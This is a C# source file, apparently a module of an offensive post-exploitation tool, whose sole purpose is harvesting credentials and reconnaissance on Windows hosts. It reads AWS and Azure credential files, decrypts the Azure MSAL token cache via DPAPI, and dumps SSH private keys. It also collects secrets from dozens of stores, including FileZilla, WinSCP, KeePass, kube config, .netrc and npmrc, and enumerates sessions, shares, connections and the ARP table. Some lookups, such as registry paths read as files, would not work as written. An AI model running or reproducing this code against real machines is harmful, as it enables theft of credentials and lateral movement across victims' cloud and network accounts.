using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace Cloudmode.Modes
{
    public class RunCloudmode
    {
        public void Execute()
        {

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials;

            // Check Azure
            try
            {
                string azureResult = Azure.CheckAzure();
                Console.WriteLine(azureResult);
            }
            catch (Exception ex)
            {

                Console.WriteLine("Error checking Azure: " + ex.Message);
            }

            // Check AWS
            try
            {
                var awsCredentials = AWS.CheckAWS();
                Console.WriteLine("AWS Config: " + awsCredentials.ConfigContent);
                Console.WriteLine("AWS Credentials: " + awsCredentials.CredentialsContent);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error checking AWS: " + ex.Message);
            }

            // Remote Connections
            try
            {
                var remoteConnectionData = RemoteConnections.FetchRemoteConnections();
                string remoteConnectionJson = new JavaScriptSerializer().Serialize(remoteConnectionData);
                string payload = "{ \"RemoteConnectionData\": " + remoteConnectionJson + " }";
                Console.WriteLine("Remote Connection Data: " + remoteConnectionJson);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error fetching remote connection data: " + ex.Message);
            }

            // Decrypt Token Cache
            try
            {
                string decryptedTokenCache = TokenCache.Decrypt();
                Console.WriteLine("Decrypted Token Cache: " + decryptedTokenCache);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error decrypting Token Cache: " + ex.Message);
            }

            // Check SSH Keys
            try
            {
                var sshKeys = SSH.CheckSSHKeys();
                foreach (var key in sshKeys)
                {
                    Console.WriteLine("SSH Public Key Path: " + key.PublicKeyPath);
                    Console.WriteLine("SSH Private Key Path: " + key.PrivateKeyPath);
                    Console.WriteLine("SSH Public Key Content: " + key.PublicKeyContent);
                    Console.WriteLine("SSH Private Key Content: " + key.PrivateKeyContent);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error checking SSH Keys: " + ex.Message);
            }

            // Check CloudMisc CloudCredentials
            try
            {
                var cloudCredentials = CloudMisc.CheckCloudMisc();
                Console.WriteLine("Cloud Credentials: " + cloudCredentials.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error fetching cloud credentials: " + ex.Message);
            }
        }
    }

    public class CloudMisc
    {
        public class CloudCredentials
        {
            public string ConfigContent { get; set; }
            public string CredentialsContent { get; set; }

            public override string ToString()
            {
                return $"ConfigContent: {ConfigContent}\nCredentialsContent: {CredentialsContent}";
            }
        }

        public static CloudCredentials CheckCloudMisc()
        {

            // Backup current Console Output
            var originalOutput = Console.Out;

            // Create a StringWriter to capture console output
            using (StringWriter stringWriter = new StringWriter())
            {
                Console.SetOut(stringWriter);
                string user = Environment.UserName;
                CloudCredentials cloudCredentials = new CloudCredentials();

                // Google Cloud Platform (GCP)
                string gcpConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "gcloud",
                    "configurations",
                    "config_default");
                string gcpCredentialsPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "gcloud",
                    "credentials.db");

                // Docker
                string dockerConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".docker",
                    "config.json");

                // Heroku
                string herokuConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".netrc");

                // Kubernetes
                string kubernetesConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".kube",
                    "config");

                // OpenShift
                string openshiftConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".kube",
                    "config");

                // Terraform
                string terraformConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".terraformrc");

                // Apache Maven
                string mavenConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".m2",
                    "settings.xml");

                // NPM (Node Package Manager)
                string npmConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".npmrc");

                // Python Pip
                string pipConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".pip",
                    "pip.conf");

                // Git
                string gitConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".gitconfig");

                // FileZilla
                string fileZillaConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "FileZilla",
                    "sitemanager.xml");

                string fileZillaRecentServersPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "FileZilla",
                    "recentservers.xml");

                string fileZillaGeneralConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "FileZilla",
                    "filezilla.xml");

                // PuTTY (Registry path)
                string puttyRegistryPath = @"HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions";

                // mRemoteNG
                string mRemoteNGConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "mRemoteNG",
                    "confCons.xml");

                // RDP/RDPW Files
                string rdpFilesDirectory = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    "RDP");

                // Visual Studio (VS)
                string visualStudioConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    "Visual Studio");

                // Visual Studio Code (VSCode)
                string vsCodeUserSettingsPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Code",
                    "User",
                    "settings.json");

                string vsCodeExtensionsPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".vscode",
                    "extensions");

                // Microsoft Teams
                string microsoftTeamsCachePath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft",
                    "Teams",
                    "Cache");

                string microsoftTeamsLocalStoragePath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft",
                    "Teams",
                    "Local Storage");

                // VPN Configuration Files
                string vpnConfigRegistryPath = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections";

                // Apache Directory Studio
                string apacheDirectoryStudioConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".ApacheDirectoryStudio");

                // CoreFTP
                string coreFTPConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "CoreFTP",
                    "sitemanager.dat");

                // CyberDuck
                string cyberDuckConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Cyberduck",
                    "bookmarks");

                // S3 Browser
                string s3BrowserConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "S3 Browser");

                // FTPNavigator
                string ftpNavigatorConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".FTPNavigator");

                // KeePass Configuration Files (KeePass1, KeePass2)
                string keepassConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    "KeePass");

                // PuttyCM
                string puttyCMConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "PuttyCM");

                // Rclone
                string rcloneConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    ".config",
                    "rclone",
                    "rclone.conf");

                // WinSCP
                string winSCPConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "WinSCP.ini");

                // gFTP
                string gFTPConfigPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".gftp",
                    "gftprc");


                cloudCredentials.ConfigContent = ReadIfExists(gcpConfigPath)
                + ReadIfExists(gcpCredentialsPath)
                + ReadIfExists(dockerConfigPath)
                + ReadIfExists(herokuConfigPath)
                + ReadIfExists(kubernetesConfigPath)
                + ReadIfExists(openshiftConfigPath)
                + ReadIfExists(terraformConfigPath)
                + ReadIfExists(mavenConfigPath)
                + ReadIfExists(npmConfigPath)
                + ReadIfExists(pipConfigPath)
                + ReadIfExists(gitConfigPath)
                + ReadIfExists(fileZillaConfigPath)
                + ReadIfExists(fileZillaRecentServersPath)
                + ReadIfExists(fileZillaGeneralConfigPath)
                + ReadIfExists(puttyRegistryPath)
                + ReadIfExists(mRemoteNGConfigPath)
                + ReadIfExists(rdpFilesDirectory)
                + ReadIfExists(visualStudioConfigPath)
                + ReadIfExists(vsCodeUserSettingsPath)
                + ReadIfExists(vsCodeExtensionsPath)
                + ReadIfExists(microsoftTeamsCachePath)
                + ReadIfExists(microsoftTeamsLocalStoragePath)
                + ReadIfExists(vpnConfigRegistryPath)
                + ReadIfExists(apacheDirectoryStudioConfigPath)
                + ReadIfExists(coreFTPConfigPath)
                + ReadIfExists(cyberDuckConfigPath)
                + ReadIfExists(s3BrowserConfigPath)
                + ReadIfExists(ftpNavigatorConfigPath)
                + ReadIfExists(keepassConfigPath)
                + ReadIfExists(puttyCMConfigPath)
                + ReadIfExists(rcloneConfigPath)
                + ReadIfExists(winSCPConfigPath)
                + ReadIfExists(gFTPConfigPath);

                /* return cloudCredentials;*/
                // Get the captured console output as a string
                string consoleOutput = stringWriter.ToString();
                Console.SetOut(originalOutput); // Restore the original console output

                Console.WriteLine(consoleOutput);  // Display captured output, or handle it as needed
                return cloudCredentials;
            }
        }

        private static string ReadIfExists(string filePath)
        {
            if (File.Exists(filePath))
            {
                return File.ReadAllText(filePath);
            }
            return "";
        }
    }
    public class WindowsSessionManager
    {
        // Constants for the Windows API functions
        const int WTS_CURRENT_SERVER_HANDLE = -1;
        const int WTS_CURRENT_SESSION = -1;

        // Struct for session information
        [StructLayout(LayoutKind.Sequential)]
        public struct WTS_SESSION_INFO
        {
            public int SessionID;
            public string WinStationName;
            public WTS_CONNECTSTATE_CLASS State;
        }

        // Enum for session connection state
        public enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,
            WTSConnected,
            WTSConnectQuery,
            WTSShadow,
            WTSDisconnected,
            WTSIdle,
            WTSListen,
            WTSReset,
            WTSDown,
            WTSInit
        }

        // Import the Windows API functions
        [DllImport("wtsapi32.dll")]
        static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] String pServerName);

        [DllImport("wtsapi32.dll")]
        static extern void WTSCloseServer(IntPtr hServer);

        [DllImport("wtsapi32.dll")]
        static extern int WTSEnumerateSessions(
            IntPtr hServer,
            int Reserved,
            int Version,
            out IntPtr ppSessionInfo,
            out int pCount);

        [DllImport("wtsapi32.dll")]
        static extern void WTSFreeMemory(IntPtr pMemory);

        // Method to retrieve logged-on sessions
        public List<WTS_SESSION_INFO> GetLoggedOnSessions()
        {
            List<WTS_SESSION_INFO> sessions = new List<WTS_SESSION_INFO>();

            IntPtr serverHandle = IntPtr.Zero;
            IntPtr sessionInfoPtr = IntPtr.Zero;
            int sessionCount = 0;
            try
            {
                serverHandle = WTSOpenServer(Environment.MachineName);

                if (WTSEnumerateSessions(serverHandle, 0, 1, out sessionInfoPtr, out sessionCount) != 0)
                {
                    int dataSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                    IntPtr currentSession = sessionInfoPtr;

                    for (int i = 0; i < sessionCount; i++)
                    {
                        WTS_SESSION_INFO sessionInfo = (WTS_SESSION_INFO)Marshal.PtrToStructure(currentSession, typeof(WTS_SESSION_INFO));
                        sessions.Add(sessionInfo);

                        currentSession += dataSize;
                    }
                }
            }
            finally
            {
                if (serverHandle != IntPtr.Zero)
                    WTSCloseServer(serverHandle);

                if (sessionInfoPtr != IntPtr.Zero)
                    WTSFreeMemory(sessionInfoPtr);
            }

            return sessions;
        }
    }

    public class NetworkInformationCollector
    {

        private static string GetPrimaryIPv4Address()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType != NetworkInterfaceType.Loopback && ni.OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties properties = ni.GetIPProperties();
                    foreach (var gateway in properties.GatewayAddresses)
                    {
                        if (gateway.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            foreach (var ip in properties.UnicastAddresses)
                            {
                                if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                                {
                                    return ip.Address.ToString();
                                }
                            }
                        }
                    }
                }
            }
            throw new Exception("No active network adapters with an IPv4 address and default gateway in the system!");
        }
        public static string CollectNetworkInformation()
        {
            StringBuilder sb = new StringBuilder();

            // Get DNS servers
            sb.AppendLine("DNS Servers:");
            foreach (IPAddress dnsServer in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                sb.AppendLine(dnsServer.ToString());
            }
            sb.AppendLine();

            // Get Primary IPv4 Address and append
            try
            {
                string primaryIPv4 = GetPrimaryIPv4Address().ToString();
                sb.AppendLine("Primary IPv4: " + primaryIPv4);
            }
            catch (Exception ex)
            {
                sb.AppendLine("Error obtaining Primary IPv4 Address: " + ex.Message);
            }

            // Get ARP table
            sb.AppendLine("ARP Table:");
            Process arpProcess = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "arp",
                    Arguments = "-a",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            arpProcess.Start();
            string arpOutput = arpProcess.StandardOutput.ReadToEnd();
            arpProcess.WaitForExit();
            sb.AppendLine(arpOutput);
            sb.AppendLine();

            // Try to access hosts file
            string hostsFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "drivers", "etc", "hosts");
            sb.AppendLine($"Hosts File ({hostsFilePath}):");
            try
            {
                string hostsFileContents = File.ReadAllText(hostsFilePath);
                sb.AppendLine(hostsFileContents);
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error accessing hosts file: {ex.Message}");
            }
            sb.AppendLine();

            // Get current routes
            sb.AppendLine("Current Routes:");
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties ipProps = ni.GetIPProperties();
                    foreach (GatewayIPAddressInformation gw in ipProps.GatewayAddresses)
                    {
                        sb.AppendLine($"Interface: {ni.Name}");
                        sb.AppendLine($"Gateway: {gw.Address}");
                    }
                }
            }

            return sb.ToString();
        }
    }
    public class RemoteConnections
    {
        public class RemoteConnectionData
        {
            public string LoggedOnUsers { get; set; }
            public string UserNetworkShares { get; set; }
            public string AllRemoteConnections { get; set; }
        }

        public static string GetLoggedOnUsers()
        {
            var output = "Logged On users...\n";

            // Query WMI for all logged users
            var query = new SelectQuery("SELECT * FROM Win32_ComputerSystem");
            var searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject mo in searcher.Get())
            {
                // Extract the username
                var username = mo["UserName"];

                if (!string.IsNullOrEmpty(username as string))
                {
                    output += $"User: {username}\n";
                }
            }

            return output;
        }

        public static string FetchRemoteConnections()
        {
            // Backup the current Console.Out
            TextWriter originalConsoleOut = Console.Out;

            // Create a StringWriter to capture console output
            StringWriter stringWriter = new StringWriter();
            Console.SetOut(stringWriter);

            try
            {
                // Execute and print SSH sessions check
                bool sshSessionsExist = CheckForSSHDSessions();
                Console.WriteLine($"SSH sessions found: {sshSessionsExist}");

                // Execute and print active TCP connections
                Console.WriteLine("Active TCP Connections:");
                List<string> activeTcpConnections = CheckActiveTcpConnections();
                foreach (var connection in activeTcpConnections)
                {
                    Console.WriteLine(connection);
                }

                // OG RemoteConnections
                string remoteConnections = GetRemoteConnections();
                Console.WriteLine("Connected Shares and LoggedOn Users:" + remoteConnections);

                // Retrieve logged-on Windows sessions
                var windowsSessionManager = new WindowsSessionManager();
                var loggedOnSessions = windowsSessionManager.GetLoggedOnSessions();
                Console.WriteLine("Active Windows Sessions: " + loggedOnSessions);

                // List RDP Sessions
                List<string> activeRDPSessions = CheckForRDPSessions();
                Console.WriteLine("Active RDP Sessions:\n" + string.Join("\n", activeRDPSessions));
            }
            finally
            {
                // Restore the original console output to ensure no cross-effects
                Console.SetOut(originalConsoleOut);
            }

            // Get the captured console output as a string
            string consoleOutput = stringWriter.ToString();
            return consoleOutput;
        }


        public static List<string> CheckActiveTcpConnections()
        {
            List<string> activeConnections = new List<string>();
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
            foreach (TcpConnectionInformation c in connections)
            {
                Console.WriteLine($"Local endpoint: {c.LocalEndPoint} <--> Remote endpoint: {c.RemoteEndPoint} - State: {c.State}");
            }
            return activeConnections;
        }

        public static List<string> CheckForRDPSessions()
        {
            Process[] rdpProcesses = Process.GetProcessesByName("mstsc");

            List<string> rdpSessions = new List<string>();
            foreach (Process process in rdpProcesses)
            {
                try
                {
                    string sessionId = process.SessionId.ToString();
                    string processName = process.ProcessName;
                    string processId = process.Id.ToString();
                    string processStartTime = process.StartTime.ToString();
                    string sessionDetails = $"Session ID: {sessionId}, Process Name: {processName}, Process ID: {processId}, Start Time: {processStartTime}";
                    rdpSessions.Add(sessionDetails);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error processing RDP session: {ex.Message}");
                }
            }

            return rdpSessions;
        }


        public static bool CheckForSSHDSessions()
        {
            Process[] sshdProcesses = Process.GetProcessesByName("sshd");
            Process[] sshProcesses = Process.GetProcessesByName("ssh");
            Process[] puttyProcesses = Process.GetProcessesByName("putty");

            // Check if any of the sshd, ssh, or putty processes are running
            return (sshdProcesses.Length > 0 || sshProcesses.Length > 0 || puttyProcesses.Length > 0);
        }


        public static string GetUserNetworkShares()
        {
            var output = "User network shares...\n";

            // Query WMI for all network connections
            var query = new SelectQuery("SELECT * FROM Win32_NetworkConnection");
            var searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject mo in searcher.Get())
            {
                // Extract the username and sharename
                var username = mo["UserName"];
                var sharename = mo["RemoteName"];

                output += $"User: {username}, Share: {sharename}\n";
            }

            return output;
        }

        public static string GetRemoteConnections()
        {
            return GetLoggedOnUsers() + "\n" + GetUserNetworkShares();
        }
    }
    public static class AWS
    {
        public class AwsCredentials
        {
            public string ConfigContent { get; set; }
            public string CredentialsContent { get; set; }
        }

        public static AwsCredentials CheckAWS()
        {
            string user = Environment.UserName;
            string awsConfigPath = $@"C:\Users\{user}\.aws\config";
            string awsCredentialsPath = $@"C:\Users\{user}\.aws\credentials";

            AwsCredentials awsCredentials = new AwsCredentials();

            bool configExists = File.Exists(awsConfigPath);
            bool credentialsExists = File.Exists(awsCredentialsPath);

            if (!configExists && !credentialsExists)
            {
                Console.WriteLine("AWS config and/or credentials file not found.");
                return null;
            }

            if (configExists)
            {
                awsCredentials.ConfigContent = File.ReadAllText(awsConfigPath);
            }

            if (credentialsExists)
            {
                awsCredentials.CredentialsContent = File.ReadAllText(awsCredentialsPath);
            }

            return awsCredentials;
        }
    }

    public static class Azure
    {
        public static string CheckAzure()
        {
            string user = Environment.UserName;
            string azureProfilePath = $@"C:\Users\{user}\.azure\azureProfile.json";

            if (File.Exists(azureProfilePath))
            {
                return File.ReadAllText(azureProfilePath);
            }
            else
            {
                Console.WriteLine("AzureProfile file not found.");
                return null;
            }
        }
    }

    public static class TokenCache
    {
        public static string Decrypt()
        {
            // Create a StringWriter to capture console output
            StringWriter stringWriter = new StringWriter();
            TextWriter originalConsoleOut = Console.Out; // Backup the current Console.Out
            Console.SetOut(stringWriter);

            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".azure", "msal_token_cache.bin");

                if (!File.Exists(filePath))
                {
                    Console.WriteLine("Token cache file not found.");
                    return null;  // Early exit if file doesn't exist
                }

                // Read the encrypted data from the file
                byte[] encryptedData = File.ReadAllBytes(filePath);

                // Unprotect the data using the same user context
                byte[] unprotectedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);

                // Convert the unprotected data bytes back to a string
                string decryptedData = Encoding.UTF8.GetString(unprotectedData);

                // Optionally print the decrypted data to console for logging
                Console.WriteLine("Decrypted token cache data retrieved successfully.");

                return decryptedData; // Return the decrypted data as a string
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error decrypting token cache: {ex.Message}");
                return null; // Return null or handle the exception as needed
            }
            finally
            {
                // Restore the standard output to the original
                Console.SetOut(originalConsoleOut);
                Console.Write(stringWriter.ToString());  // Output all captured content
            }
        }




        /*        public static string Decrypt()
                {
                    string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".azure", "msal_token_cache.bin");

                    // Read the encrypted data from the file
                    byte[] encryptedData = File.ReadAllBytes(filePath);

                    // Unprotect the data using the same user context
                    byte[] unprotectedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);

                    // Convert the unprotected data bytes back to a string
                    string decryptedData = Encoding.UTF8.GetString(unprotectedData);

                    return decryptedData; // Return the decrypted data as a string
                }*/
    }

    public static class SSH
    {
        public class Keys
        {
            public string PublicKeyPath { get; set; }
            public string PrivateKeyPath { get; set; }
            public string PublicKeyContent { get; set; }
            public string PrivateKeyContent { get; set; }
        }

        public static List<Keys> CheckSSHKeys()
        {
            StringWriter stringWriter = new StringWriter();
            TextWriter originalConsoleOut = Console.Out; // Backup the current Console.Out
            Console.SetOut(stringWriter);

            string homePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string sshDir = Path.Combine(homePath, ".ssh");
            List<Keys> keysList = new List<Keys>();

            try
            {
                if (Directory.Exists(sshDir))
                {
                    // Retrieve all public key files
                    string[] publicKeyPaths = Directory.GetFiles(sshDir, "*.pub");
                    foreach (string publicKeyPath in publicKeyPaths)
                    {
                        Keys key = new Keys();
                        key.PublicKeyPath = publicKeyPath;

                        // Try to read the public key content
                        try
                        {
                            key.PublicKeyContent = File.ReadAllText(publicKeyPath);
                        }
                        catch (Exception ex)
                        {
                            key.PublicKeyContent = $"Error reading public key: {ex.Message}";
                        }

                        // Corresponding private key
                        string privateKeyPath = publicKeyPath.Replace(".pub", "");
                        key.PrivateKeyPath = privateKeyPath;

                        // Try to read the private key content
                        try
                        {
                            if (File.Exists(privateKeyPath))
                            {
                                key.PrivateKeyContent = File.ReadAllText(privateKeyPath);
                            }
                            else
                            {
                                key.PrivateKeyContent = "Private key file not found.";
                            }
                        }
                        catch (Exception ex)
                        {
                            key.PrivateKeyContent = $"Error reading private key: {ex.Message}";
                        }

                        keysList.Add(key);
                    }
                }
                else
                {
                    Console.WriteLine("SSH directory does not exist.");
                }
            }
            finally
            {
                // Restore the standard output and output all captured content
                Console.SetOut(originalConsoleOut);
                Console.Write(stringWriter.ToString());
            }

            return keysList;
        }
    }
}
